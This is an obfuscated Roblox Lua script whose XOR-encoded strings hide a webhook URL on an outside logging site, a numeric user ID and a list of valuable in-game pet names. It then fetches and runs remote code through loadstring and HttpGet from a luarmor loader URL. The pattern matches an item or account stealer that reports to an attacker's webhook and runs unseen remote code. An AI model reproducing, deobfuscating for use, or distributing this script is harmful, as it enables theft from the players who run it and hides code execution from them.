--[[ Obfuscated with Prometheus-style engine ]]
local _OOl0IOIlO0=200;local _lO0IOllIIl=246;local _IOlOllll0I=985;local _Il00O0IIIO="_OIOI00";local _llIOIIOO00=663;
local _OO0llI0OOlOlIOO0=(function(_I0lIll00)return function(...)local _I00OIOIO=""for _,_l0O0IlIO in ipairs({...})do _I00OIOIO=_I00OIOIO..string.char(bit32 and bit32.bxor(_l0O0IlIO,_I0lIll00)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_l0O0IlIO,_I0lIll00))end return _I00OIOIO end end)(206);
local _O0lOlIO0OOII=function()
getgenv()._IllII0IO00l00l = _OO0llI0OOlOlIOO0(166,186,186,190,189,244,225,225,189,165,175,163,175,224,160,171,186,225,175,190,167,225,162,161,169,189,225,185,171,172,166,161,161,165,225,163,188,188,145,172,249,253,247,248,172,252,173,252,175,253,247,250,247,173,172,175,249,252,248,253,246,172,172,250,247,252,254,251,175,246,247)
getgenv()._lIO00OI0O0IOl0 = 9051808265
getgenv()._0I0O0l0OlIOIOO = 1      
getgenv()._IlOIOIIlllIll0 = 2 
getgenv()._llI0II0OOOOlO0 = {
    [_OO0llI0OOlOlIOO0(131,171,161,185,162)] = true,
    [_OO0llI0OOlOlIOO0(157,165,167,172,167,170,167,238,154,161,167,162,171,186)] = true,
    [_OO0llI0OOlOlIOO0(157,186,188,175,185,172,171,188,188,183,238,139,162,171,190,166,175,160,186)] = true,
    [_OO0llI0OOlOlIOO0(141,171,188,172,171,188,187,189)] = true,
    [_OO0llI0OOlOlIOO0(141,175,190,167,186,175,160,161,238,131,161,172,183)] = true,
    [_OO0llI0OOlOlIOO0(140,187,188,169,187,188,161,238,143,160,170,238,136,188,183,187,188,161)] = true,
    [_OO0llI0OOlOlIOO0(137,175,188,175,163,175,238,175,160,170,238,131,175,170,187,160,170,187,160,169)] = true,
    [_OO0llI0OOlOlIOO0(133,171,186,173,166,187,188,187,238,175,160,170,238,131,187,189,186,187,188,187)] = true,
    [_OO0llI0OOlOlIOO0(138,188,175,169,161,160,238,141,175,160,160,171,162,162,161,160,167)] = true,
    [_OO0llI0OOlOlIOO0(136,188,175,169,188,175,163,175,238,175,160,170,238,141,166,161,173,188,175,163,175)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,141,175,189,175,238,140,161,161)] = true,
    [_OO0llI0OOlOlIOO0(157,190,161,161,165,183,238,175,160,170,238,158,187,163,190,165,183)] = true,
    [_OO0llI0OOlOlIOO0(137,167,160,169,171,188,238,137,171,188,175,186)] = true,
    [_OO0llI0OOlOlIOO0(130,161,184,171,238,130,161,184,171,238,140,171,175,188)] = true,
    [_OO0llI0OOlOlIOO0(133,171,186,187,190,175,186,238,140,188,161,189)] = true,
    [_OO0llI0OOlOlIOO0(141,161,161,165,167,238,175,160,170,238,131,167,162,165,167)] = true,
    [_OO0llI0OOlOlIOO0(158,161,190,173,187,188,187,238,175,160,170,238,136,167,180,180,187,188,187)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,157,187,190,188,171,163,171,238,141,161,163,172,167,160,175,189,167,161,160)] = true,
    [_OO0llI0OOlOlIOO0(138,188,175,169,161,160,238,137,167,160,169,171,188,167,160,167)] = true,
    [_OO0llI0OOlOlIOO0(134,171,175,170,162,171,189,189,238,134,161,188,189,171,163,175,160)] = true,
    [_OO0llI0OOlOlIOO0(134,183,170,188,175,238,138,188,175,169,161,160,238,141,175,160,160,171,162,162,161,160,167)] = true,
    [_OO0llI0OOlOlIOO0(140,175,173,187,188,187,238,175,160,170,238,139,169,169,187,188,187)] = true,
    [_OO0llI0OOlOlIOO0(141,166,167,190,189,161,238,175,160,170,238,159,187,171,189,161)] = true,
    [_OO0llI0OOlOlIOO0(153,238,161,188,238,130)] = true,
    [_OO0llI0OOlOlIOO0(128,187,173,162,171,175,188,161,238,138,167,160,161,189,189,175,187,188,161)] = true,
    [_OO0llI0OOlOlIOO0(131,161,160,171,183,238,131,161,160,171,183,238,158,187,169,169,183)] = true,
    [_OO0llI0OOlOlIOO0(133,171,186,187,190,175,186,238,133,171,190,175,186)] = true,
    [_OO0llI0OOlOlIOO0(154,175,160,169,238,154,175,160,169,238,133,171,162,171,186,175,160,169)] = true,
    [_OO0llI0OOlOlIOO0(154,167,173,186,175,173,238,157,175,166,187,188)] = true,
    [_OO0llI0OOlOlIOO0(130,175,184,175,170,161,188,167,186,161,238,157,190,167,160,167,186,161)] = true,
    [_OO0llI0OOlOlIOO0(143,169,175,188,188,167,160,167,238,162,175,238,158,175,162,167,160,167)] = true,
    [_OO0llI0OOlOlIOO0(136,188,175,169,161,162,175,238,130,175,238,130,175,238,130,175)] = true,
    [_OO0llI0OOlOlIOO0(139,182,186,167,160,173,186,238,131,175,186,186,171,161)] = true,
    [_OO0llI0OOlOlIOO0(133,175,188,165,171,188,238,157,175,166,187,188)] = true,
    [_OO0llI0OOlOlIOO0(140,187,160,160,183,163,175,160)] = true,
    [_OO0llI0OOlOlIOO0(158,167,188,187,162,167,186,161,167,186,175,238,140,167,173,167,173,162,171,186,171,167,188,175)] = true,
    [_OO0llI0OOlOlIOO0(140,187,160,167,186,161,238,140,187,160,167,186,161,238,157,190,167,160,167,186,161)] = true,
    [_OO0llI0OOlOlIOO0(140,188,187,160,167,186,161,238,131,175,188,189,167,186,161)] = true,
    [_OO0llI0OOlOlIOO0(137,187,171,189,186,238,248,248,248)] = true,
    [_OO0llI0OOlOlIOO0(157,185,175,169,238,157,161,170,175)] = true,
    [_OO0llI0OOlOlIOO0(131,175,188,167,175,173,166,167,238,141,161,188,175,180,161,160,167)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,134,161,186,189,190,161,186,189,167,186,161,189)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,140,188,161,189)] = true,
    [_OO0llI0OOlOlIOO0(154,188,175,162,175,162,171,170,161,160)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,158,187,169,169,167,171,189)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,158,188,167,163,161,189)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,154,175,173,161,188,167,186,175,189)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,157,190,175,169,166,171,186,186,167,189)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,157,171,165,161,162,175,166,189)] = true,
    [_OO0llI0OOlOlIOO0(156,171,167,160,167,186,161,238,157,162,171,167,169,166,167,186,161)] = true,
    [_OO0llI0OOlOlIOO0(156,161,189,171,183,238,175,160,170,238,154,171,170,170,183)] = true,
    [_OO0llI0OOlOlIOO0(141,171,162,187,162,175,188,173,167,160,167,238,152,167,173,167,161,189,167,160,167)] = true,
    [_OO0llI0OOlOlIOO0(131,167,171,186,171,186,171,167,188,175,238,140,167,173,167,173,162,171,186,171,167,188,175)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,137,188,175,160,170,171,238,141,161,163,172,167,160,175,189,167,161,160)] = true,
    [_OO0llI0OOlOlIOO0(137,188,175,167,190,187,189,189,238,131,171,170,187,189,189,167)] = true,
    [_OO0llI0OOlOlIOO0(137,129,143,154)] = true,
    [_OO0llI0OOlOlIOO0(130,175,189,238,154,188,175,162,175,162,171,188,167,186,175,189)] = true,
    [_OO0llI0OOlOlIOO0(130,161,189,238,154,188,175,162,175,162,171,188,167,186,161,189)] = true,
    [_OO0llI0OOlOlIOO0(136,171,189,186,167,184,171,238,248,249)] = true,
    [_OO0llI0OOlOlIOO0(157,185,175,169,169,183,238,140,188,161,189)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,156,161,163,175,160,186,167,173,238,137,188,175,160,170,171)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,154,175,173,161,238,141,161,163,172,167,160,175,189,167,161,160)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,132,161,162,162,183,238,137,188,175,160,170,171)] = true,
    [_OO0llI0OOlOlIOO0(137,161,172,172,162,167,160,161,238,155,160,167,173,167,173,162,167,160,161)] = true,
    [_OO0llI0OOlOlIOO0(154,187,168,168,238,154,161,187,173,175,160)] = true,
    [_OO0llI0OOlOlIOO0(141,166,167,162,162,167,160,238,141,166,167,162,167)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,157,190,161,161,165,183,238,137,188,175,160,170,171)] = true,
    [_OO0llI0OOlOlIOO0(154,175,173,161,188,167,186,175,238,140,167,173,167,173,162,171,186,175)] = true,
    [_OO0llI0OOlOlIOO0(158,171,188,188,167,186,161,238,140,187,188,188,167,186,161)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,139,182,186,167,160,173,186,238,137,188,175,160,170,171)] = true,
    [_OO0llI0OOlOlIOO0(159,187,171,189,175,170,167,162,162,161,238,152,175,163,190,167,188,161)] = true,
    [_OO0llI0OOlOlIOO0(130,175,238,152,175,173,173,175,238,157,175,186,187,188,160,161,238,157,175,186,187,188,160,167,186,175)] = true
}
loadstring(game:HttpGet(_OO0llI0OOlOlIOO0(166,186,186,190,189,244,225,225,175,190,167,224,162,187,175,188,163,161,188,224,160,171,186,225,168,167,162,171,189,225,184,250,225,162,161,175,170,171,188,189,225,247,175,247,255,172,253,172,175,248,168,172,249,255,250,252,253,246,251,253,171,173,252,168,246,246,251,173,250,252,170,248,249,224,162,187,175)))()
end;
local _,_I0ll00IO=pcall(_O0lOlIO0OOII);if _I0ll00IO then _O0lOlIO0OOII()end;
